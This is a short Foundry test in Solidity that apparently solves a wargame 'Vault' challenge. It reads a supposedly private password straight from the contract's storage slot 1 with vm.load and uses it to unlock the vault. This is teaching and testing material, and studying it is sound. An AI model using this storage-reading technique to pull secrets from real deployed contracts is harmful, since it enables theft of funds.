// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/08_vault.sol";

contract AttackerVaultTest is Test {
    function testVault(bytes32 passwd) external {
        vm.prank(address(0x1));
        Vault vault = new Vault(passwd);

        bytes32 pass = vm.load(address(vault), bytes32(uint256(1)));
        emit log_bytes32(pass);

        assertTrue(vault.locked());
        vault.unlock(pass);
        assertFalse(vault.locked());
    }
}
